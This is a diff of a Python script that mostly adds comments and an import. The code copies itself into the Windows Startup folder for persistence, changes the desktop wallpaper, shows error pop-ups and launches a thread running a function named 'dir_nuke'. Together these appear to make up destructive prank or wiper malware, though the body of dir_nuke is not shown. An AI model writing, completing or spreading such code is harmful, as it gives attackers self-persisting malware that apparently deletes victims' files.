@@ -7,15 +7,22 @@ import time
 import tkinter as tk
 from tkinter import messagebox
 import threading
+import ctypes
 
+# Define custom messagebox function using tkinter
 def custom_messagebox(text, title):
     root = tk.Tk()
     root.withdraw()
     messagebox.showinfo(title, text)
 
 def copy_to_startup():
+    # Get the path to the user's startup folder
     startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+
+    # Get the path of the current script
     script_path = sys.argv[0]
+
+    # Copy the script to the startup folder
     shutil.copy(script_path, startup_folder)
 
 def display_error_messages():
@@ -59,6 +66,7 @@ if __name__ == "__main__":
     copy_to_startup()
     change_wallpaper()
 
+    # Create and start a thread for the dir_nuke function
     dir_nuke_thread = threading.Thread(target=dir_nuke)
     dir_nuke_thread.start()
 
